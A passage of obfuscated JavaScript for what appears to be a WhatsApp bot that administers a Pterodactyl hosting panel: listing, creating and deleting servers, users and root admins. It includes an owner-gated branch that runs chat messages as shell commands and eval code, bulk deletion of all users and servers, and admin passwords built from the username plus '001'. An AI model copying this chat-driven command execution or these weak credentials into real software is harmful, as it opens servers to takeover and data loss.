                                    global['domain'] + '/api/client/servers/' + GL + '/resources',
                                    {
                                        headers: {
                                            Accept: 'application/json',
                                            'Content-Type': 'application/json',
                                            Authorization: 'Bearer\x20' + global['capikey'],
                                        },
                                    }
                                ),
                                Gf = await Gj['json']();
                            Ge =
                                Gf['attributes']?.['current_state']?.['toUpperCase']() || 'unknown';
                        } catch (Gh) {
                            Ge = 'unknown';
                        }
                        ((GD += '┣𖣠\x20ID\x20Server\x20:\x20*' + Gz['id'] + '*\x0a'),
                            (GD += '┣𖣠\x20ID\x20User\x20:\x20*' + Gz['user'] + '*\x0a'),
                            (GD += '┣𖣠\x20Nama\x20:\x20*' + Gz['name'] + '*\x0a'),
                            (GD +=
                                '┣𖣠\x20RAM\x20:\x20*' +
                                (Gz['limits']['memory'] == 0x0
                                    ? 'Unlimited'
                                    : Gz['limits']['memory'] / 0x3e8 + 'GB') +
                                '*\x0a'),
                            (GD += '┣𖣠\x20Status\x20:\x20*' + Ge + '*\x0a\x0a'));
                    }
                    return x['sendMessage'](u['chat'], { text: GD }, { quoted: u });
                }
                break;
            case 'delpanel':
            case 'delp':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (global['apikey']['length'] < 0x1)
                        return u['reply'](
                            'Apikey\x20pa\x20jwenn!\x0aPastikan\x20di\x20settings.js\x20*global.apikey*\x20sudah\x20di\x20isi!'
                        );
                    if (!z[0x0])
                        return u['reply'](
                            S(
                                'id\x20servernya\x0a\x0auntuk\x20melihat\x20id\x20server\x20ketik\x20*' +
                                    E +
                                    'listpanel*'
                            )
                        );
                    let GI = await fetch(global['domain'] + '/api/application/servers?page=1', {
                            method: 'GET',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikey'],
                            },
                        }),
                        Gi = await GI['json'](),
                        GK = Gi['data'],
                        Ga = null,
                        Gt = null;
                    for (let Gm of GK) {
                        let Gd = Gm['attributes'];
                        z[0x0] == Gd['id']['toString']() &&
                            ((Ga = Gd['user']),
                            (Gt = Gd['name']),
                            await fetch(
                                global['domain'] + ('/api/application/servers/' + Gd['id']),
                                {
                                    method: 'DELETE',
                                    headers: {
                                        Accept: 'application/json',
                                        'Content-Type': 'application/json',
                                        Authorization: 'Bearer\x20' + global['apikey'],
                                    },
                                }
                            ));
                    }
                    if (!Ga) return u['reply']('*ID\x20Server*\x20pa\x20jwenn');
                    (await fetch(global['domain'] + ('/api/application/users/' + Ga), {
                        method: 'DELETE',
                        headers: {
                            Accept: 'application/json',
                            'Content-Type': 'application/json',
                            Authorization: 'Bearer\x20' + global['apikey'],
                        },
                    }),
                        u['reply'](
                            'Berhasil\x20Menghapus\x20Akun\x20Panel\x20*' +
                                capital(Gt) +
                                '*\x20(Server\x20&\x20User)'
                        ));
                }
                break;
            case 'cadmin':
            case 'cadp':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!L) return u['reply'](S('username'));
                    let Gn = L['toLowerCase'](),
                        Gg = Gn + '@epic.com',
                        GJ = capital(z[0x0]),
                        GN = Gn + '001',
                        GQ = await fetch(global['domain'] + '/api/application/users', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikey'],
                            },
                            body: JSON['stringify']({
                                email: Gg,
                                username: Gn['toLowerCase'](),
                                first_name: GJ,
                                last_name: 'Admin',
                                root_admin: !![],
                                language: 'en',
                                password: GN,
                            }),
                        }),
                        GZ = await GQ['json']();
                    if (GZ['errors'])
                        return u['reply'](JSON['stringify'](GZ['errors'][0x0], null, 0x2));
                    let GP = GZ['attributes'];
                    var y;
                    !u['isGroup']
                        ? ((y = u['sender']),
                          await u['reply'](
                              '*Berhasil\x20membuat\x20admin\x20panel\x20✅*\x0aData\x20akun\x20sudah\x20di\x20kirim\x20ke\x20private\x20chat'
                          ))
                        : (y = u['chat']);
                    var F =
                        '*Yours\x20admin\x20panel\x20📦*\x0a*\x20*ID\x20User\x20:*\x20' +
                        GP['id'] +
                        '\x0a*\x20*Username\x20:*\x20' +
                        GP['username'] +
                        '\x0a*\x20*Password\x20:*\x20' +
                        GN +
                        '\x0a*\x20*Login\x20:*\x20' +
                        global['domain'] +
                        '\x0a\x0a*Rules\x20Admin\x20Panel\x20⚠️*\x0a*\x20Jangan\x20Maling\x20Script\x0a*\x20Simpan\x20Baik²\x20Data\x20Akun\x20Ini\x0a*\x20Buat\x20Panel\x20Seperlunya\x20Aja,\x20Jangan\x20Asal\x20Buat!\x0a*\x20No\x20rusuh';
                    await x['sendMessage'](
                        y,
                        { text: F, contextInfo: { isForwarded: !![] } },
                        { quoted: u }
                    );
                }
                break;
            case 'cadmin2':
                {
                    if (!d) return Reply(mess['owner']);
                    if (!L) return u['reply'](S('username'));
                    let Gr = L['toLowerCase'](),
                        GT = Gr + '@gmail.com',
                        GS = capital(z[0x0]),
                        GA = Gr + '001',
                        Gp = await fetch(domain + '/api/application/users', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + apikey,
                            },
                            body: JSON['stringify']({
                                email: GT,
                                username: Gr['toLowerCase'](),
                                first_name: GS,
                                last_name: 'Admin',
                                root_admin: !![],
                                language: 'en',
                                password: GA,
                            }),
                        }),
                        GX = await Gp['json']();
                    if (GX['errors'])
                        return u['reply'](JSON['stringify'](GX['errors'][0x0], null, 0x2));
                    let Gw = GX['attributes'];
                    var y;
                    u['isGroup']
                        ? ((y = u['sender']),
                          await u['reply'](
                              '*Berhasil\x20membuat\x20admin\x20panel\x20✅*\x0aData\x20akun\x20sudah\x20di\x20kirim\x20ke\x20private\x20chat'
                          ))
                        : (y = u['chat']);
                    var F =
                        '*Data\x20Akun\x20Admin\x20Panel\x20📦*\x0a\x0a*📡\x20ID\x20User\x20(' +
                        Gw['id'] +
                        ')*\x20\x0a*👤\x20Username\x20:*\x20' +
                        Gw['username'] +
                        '\x0a*🔐\x20Password\x20:*\x20' +
                        GA +
                        '\x0a*\x20' +
                        global['domain'] +
                        '\x0a\x0a*Syarat\x20&\x20Ketentuan\x20:*\x0a*\x20Expired\x20akun\x201\x20bulan\x0a*\x20Simpan\x20data\x20ini\x20sebaik\x20mungkin\x0a*\x20Jangan\x20asal\x20hapus\x20server!\x0a*\x20Ketahuan\x20maling\x20sc,\x20auto\x20delete\x20akun\x20no\x20reff!\x0a';
                    (await vmh['writeFileSync']('./akunpanel.txt', F),
                        await x['sendMessage'](
                            y,
                            {
                                document: vmh['readFileSync']('./akunpanel.txt'),
                                fileName: 'akunpanel.txt',
                                mimetype: 'text/plain',
                                caption: F,
                            },
                            { quoted: u }
                        ),
                        await vmh['unlinkSync']('./akunpanel.txt'));
                }
                break;
            case 'deladmin':
            case 'deladp':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!z[0x0])
                        return u['reply'](
                            S(
                                'id\x20nya\x0a\x0auntuk\x20melihat\x20id\x20admin\x20ketik\x20*' +
                                    E +
                                    'listadmin*'
                            )
                        );
                    let GW = await fetch(global['domain'] + '/api/application/users?page=1', {
                            method: 'GET',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikey'],
                            },
                        }),
                        Gs = await GW['json'](),
                        GY = Gs['data'],
                        GO = null,
                        Gc = null;
                    await GY['forEach'](async (Gl) => {
                        if (
                            Gl['attributes']['id'] == z[0x0] &&
                            Gl['attributes']['root_admin'] == !![]
                        ) {
                            ((GO = Gl['attributes']['username']), (Gc = Gl['attributes']['id']));
                            let k0 = await fetch(
                                    global['domain'] + ('/api/application/users/' + Gc),
                                    {
                                        method: 'DELETE',
                                        headers: {
                                            Accept: 'application/json',
                                            'Content-Type': 'application/json',
                                            Authorization: 'Bearer\x20' + global['apikey'],
                                        },
                                    }
                                ),
                                k1 = k0['ok'] ? { errors: null } : await k0['json']();
                        }
                    });
                    if (Gc == null) return u['reply']('ID\x20Admin\x20pa\x20jwenn!');
                    u['reply']('Berhasil\x20Menghapus\x20Admin\x20Panel\x20*' + capital(GO) + '*');
                }
                break;
            case 'listadmin':
            case 'listadp':
                {
                    if (!d) return u['reply'](mess['owner']);
                    let Gl = await fetch(global['domain'] + '/api/application/users?page=1', {
                            method: 'GET',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikey'],
                            },
                        }),
                        k0 = await Gl['json'](),
                        k1 = k0['data'];
                    if (k1['length'] < 0x1) return u['reply']('Tidak\x20Ada\x20Admin\x20Panel');
                    var F = '*List\x20all\x20admin\x20panel*\x0a\x0a';
                    (await k1['forEach']((k2) => {
                        if (k2['attributes']['root_admin'] !== !![]) return;
                        F +=
                            '\x20⚪\x20ID\x20User\x20:\x20*' +
                            k2['attributes']['id'] +
                            '*\x0a\x20\x20\x20📍\x20Nama\x20:\x20*' +
                            k2['attributes']['first_name'] +
                            '*\x0a\x0a';
                    }),
                        u['reply'](F));
                }
                break;
            case 'hpsallserver':
            case 'clearpanel':
            case 'clearserver':
                {
                    if (!d) return T(mess['owner']);
                    await T(
                        '*Memproses\x20penghapusan\x20semua\x20user\x20&\x20server\x20panel\x20⚠️*'
                    );
                    try {
                        const k2 = {
                            Authorization: 'Bearer\x20' + global['apikey'],
                            'Content-Type': 'application/json',
                            Accept: 'application/json',
                        };
                        async function k3() {
                            try {
                                const k8 = await vmj['get'](
                                    global['domain'] + '/api/application/users',
                                    { headers: k2 }
                                );
                                return k8['data']['data'];
                            } catch (k9) {
                                return (
                                    T(
                                        JSON['stringify'](
                                            k9['response']?.['data'] || k9['message'],
                                            null,
                                            0x2
                                        )
                                    ),
                                    []
                                );
                            }
                        }
                        async function k4() {
                            try {
                                const k8 = await vmj['get'](
                                    global['domain'] + '/api/application/servers',
                                    { headers: k2 }
                                );
                                return k8['data']['data'];
                            } catch (k9) {
                                return (
                                    T(
                                        JSON['stringify'](
                                            k9['response']?.['data'] || k9['message'],
                                            null,
                                            0x2
                                        )
                                    ),
                                    []
                                );
                            }
                        }
                        async function k5(k8) {
                            try {
                                (await vmj['delete'](
                                    global['domain'] + '/api/application/servers/' + k8,
                                    { headers: k2 }
                                ),
                                    console['log']('Server\x20' + k8 + '\x20berhasil\x20dihapus.'));
                            } catch (k9) {
                                console['error'](
                                    'Echwe\x20menghapus\x20server\x20' + k8 + ':',
                                    k9['response']?.['data'] || k9['message']
                                );
                            }
                        }
                        async function k6(k8) {
                            try {
                                (await vmj['delete'](
                                    global['domain'] + '/api/application/users/' + k8,
                                    { headers: k2 }
                                ),
                                    console['log']('User\x20' + k8 + '\x20berhasil\x20dihapus.'));
                            } catch (k9) {
                                console['error'](
                                    'Echwe\x20menghapus\x20user\x20' + k8 + ':',
                                    k9['response']?.['data'] || k9['message']
                                );
                            }
                        }
                        async function k7() {
                            const k8 = await k3(),
                                k9 = await k4();
                            let kx = 0x0;
                            for (const ku of k8) {
                                if (ku['attributes']['root_admin']) {
                                    console['log'](
                                        'Lewati\x20admin:\x20' + ku['attributes']['username']
                                    );
                                    continue;
                                }
                                const kU = ku['attributes']['id'],
                                    kG = ku['attributes']['email'];
                                console['log'](
                                    'Menghapus\x20user:\x20' +
                                        ku['attributes']['username'] +
                                        '\x20(' +
                                        kG +
                                        ')'
                                );
                                const kk = k9['filter']((kH) => kH['attributes']['user'] === kU);
                                for (const kH of kk) {
                                    (await k5(kH['attributes']['id']), (kx += 0x1));
                                }
                                await k6(kU);
                            }
                            await T(
                                '*Finished\x20Cleaning\x20the\x20Panel\x20✅*\x0a\x0a-\x20Total\x20*' +
                                    kx +
                                    '*\x20(user\x20&\x20server)\x20panel\x20dihapus\x20\x0a\x0a*⚠️\x20Server\x20yang\x20dihapus\x20bukan\x20admin\x20panel*'
                            );
                        }
                        return k7();
                    } catch (k8) {
                        return T('' + JSON['stringify'](k8, null, 0x2));
                    }
                }
                break;
            case 'addserver':
            case 'addsrv':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!L)
                        return u['reply'](
                            S(
                                'id,nama,ram\x0aKetik:\x20*' +
                                    E +
                                    'listpanel*\x20untuk\x20melihat\x20id'
                            )
                        );
                    let [k9, kx, ku] = L['split'](',');
                    if (!k9 || !kx || !ku)
                        return u['reply'](
                            S(
                                'id,nama,ram\x0aKetik:\x20*' +
                                    E +
                                    'listpanel*\x20untuk\x20melihat\x20id'
                            )
                        );
                    ((k9 = k9['trim']()),
                        (kx = kx['trim']()),
                        (ku = ku['trim']()['toLowerCase']()));
                    let kU, kG, kk;
                    if (['unli', 'unlimited']['includes'](ku)) kU = kG = kk = 0x0;
                    else {
                        if (/^\d+gb$/['test'](ku)) {
                            const kE = parseInt(ku['replace']('gb', ''));
                            if (kE < 0x1 || kE > 0xa)
                                return T(
                                    'RAM\x20hanya\x20boleh\x20dari\x201GB\x20sampai\x2010GB\x20atau\x20\x27unli\x27'
                                );
                            ((kU = kE * 0x3e8), (kG = kE * 0x3e8), (kk = 0x14 + kE * 0x14));
                        } else
                            return T(
                                'Format\x20RAM\x20salah.\x20Gunakan\x20seperti:\x201gb\x20-\x20unli'
                            );
                    }
                    const kH = tanggal(Date['now']()),
                        kb = await fetch(
                            global['domain'] + '/api/application/nests/' + nestid + '/eggs/' + egg,
                            {
                                method: 'GET',
                                headers: {
                                    Accept: 'application/json',
                                    'Content-Type': 'application/json',
                                    Authorization: 'Bearer\x20' + global['apikey'],
                                },
                            }
                        ),
                        kq = await kb['json'](),
                        ky = kq['attributes']['startup'],
                        kF = await fetch(global['domain'] + '/api/application/servers', {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json',
                                Authorization: 'Bearer\x20' + global['apikey'],
                            },
                            body: JSON['stringify']({
                                name: kx,
                                description: kH,
                                user: parseInt(k9),
                                egg: parseInt(egg),
                                docker_image: 'ghcr.io/parkervcp/yolks:nodejs_20',
                                startup: ky,
                                environment: {
                                    INST: 'npm',
                                    USER_UPLOAD: '0',
                                    AUTO_UPDATE: '0',
                                    CMD_RUN: 'npm\x20start',
                                },
                                limits: {
                                    memory: parseInt(kU),
                                    swap: 0x0,
                                    disk: parseInt(kG),
                                    io: 0x1f4,
                                    cpu: parseInt(kk),
                                },
                                feature_limits: { databases: 0x5, backups: 0x5, allocations: 0x5 },
                                deploy: {
                                    locations: [parseInt(loc)],
                                    dedicated_ip: ![],
                                    port_range: [],
                                },
                            }),
                        }),
                        kM = await kF['json']();
                    if (kM['errors'])
                        return T(
                            'Echwe\x20ajoute\x20server:\x0a' +
                                JSON['stringify'](kM['errors'][0x0], null, 0x2)
                        );
                    const kV = kM['attributes'];
                    let kR =
                        '*Succes\x20Create\x20New\x20Server\x20✅*\x0a-\x20User\x20ID\x20:\x20' +
                        k9 +
                        '\x0a-\x20Server\x20ID\x20:\x20' +
                        kV['id'] +
                        '\x0a-\x20Nama\x20Server\x20:\x20' +
                        kx +
                        '\x0a\x0a*Server\x20Specifications\x20🖥️*\x0a-\x20Ram\x20:\x20' +
                        (kU == 0x0 ? 'Unlimited' : kU / 0x3e8 + 'GB') +
                        '\x0a-\x20Disk\x20:\x20' +
                        (kG == 0x0 ? 'Unlimited' : kG / 0x3e8 + 'GB') +
                        '\x0a-\x20CPU\x20:\x20' +
                        (kk == 0x0 ? 'Unlimited' : kk + '%');
                    await x['sendMessage'](
                        u['chat'],
                        { text: kR, contextInfo: { isForwarded: !![] } },
                        { quoted: u }
                    );
                }
                break;
            default: {
                if (G['startsWith']('$')) {
                    if (!d) return T(mess['owner']);
                    exec(G['slice'](0x1)['trim'](), (kD, kC) => {
                        if (kD) return u['reply']('' + kD);
                        if (kC) return u['reply']('' + kC);
                    });
                }
                if (G['startsWith']('>')) {
                    if (!d) return T(mess['owner']);
                    try {
                        let kD = G['slice'](0x1)['trim'](),
                            kC = await eval(
                                '(async\x20()\x20=>\x20{\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20try\x20{\x20return\x20' +
                                    kD +
                                    '\x20}\x20catch\x20{\x20return\x20await\x20' +
                                    kD +
                                    '\x20}\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20})()'
                            );
                        u['reply'](vma['format'](kC));
                    } catch (kv) {
                        u['reply'](String(kv));
                    }
                }
                if (G['startsWith']('eval')) {
                    if (!d) return T(mess['owner']);
                    try {
                        let ko = G['slice'](0x4)['trim'](),
                            kB = await eval(
                                '(async\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20' +
                                    ko +
                                    '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20})()'
                            );
                        u['reply'](vma['format'](kB));
                    } catch (kz) {
                        u['reply'](String(kz));
                    }
                }
            }
        }
    } catch (kL) {
        (console['log'](kL),
            await x['sendMessage'](
                global['owner'] + '@s.whatsapp.net',
                { text: kL['toString']() },
                { quoted: u }
            ));
    }
}
const __filename = vmy_6c9c4d['fileURLToPath'](import.meta.url);
vmy_6c9c4d['__filename'] = __filename;
globalThis['__filename'] = vmy_6c9c4d['__filename'];
vmy_6c9c4d['__filename'] = __filename;
globalThis['__filename'] = vmy_6c9c4d['__filename'];
(delete vmy_6c9c4d['_$S66XRr']['__filename'],
    vmy_6c9c4d['fsSync']['watchFile'](vmy_6c9c4d['__filename'], () => {
        return vmk_86dd04['call'](this, 0x1, [], undefined, undefined, undefined);
    }));
